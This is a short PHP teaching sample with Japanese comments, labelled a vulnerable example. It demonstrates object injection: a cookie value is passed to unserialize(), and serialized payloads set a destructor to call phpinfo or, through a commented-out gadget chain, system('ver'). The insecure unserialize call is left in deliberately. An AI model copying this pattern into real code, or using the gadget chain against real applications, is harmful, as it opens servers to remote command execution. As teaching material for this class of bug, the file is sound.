<?php // 脆弱なサンプル
class F {  // 本来シリアライズされるはずのクラス
}

class G { // デストラクタを持つクラス
  private $func;
  public function __construct($func) {
    $this->func = $func;
  }
  public function __destruct() {
    call_user_func($this->func);    // call_user_func関数を呼んでいる
  }
}

class H {  // デストラクタはないが call_user_func_array 呼び出しがあるクラス
  private $func;
  private $args;
  public function __construct($func, $args) {
    $this->func = $func;
    $this->args = $args;
  }
  public function exec() {
    call_user_func_array($this->func, $this->args);
  }
}

$cookie = "O:1:\"G\":1:{s:7:\"\0G\0func\";s:7:\"phpinfo\";}"; // $_COOKIE['FOO'];
// $cookie = "O:1:\"G\":1:{s:7:\"\0G\0func\";a:2:{i:0;O:1:\"H\":2:{s:7:\"\0H\0func\";s:6:\"system\";s:7:\"\0H\0args\";a:1:{i:0;s:3:\"ver\";}}i:1;s:4:\"exec\";}}"; // $_COOKIE['FOO'];
unserialize($cookie);
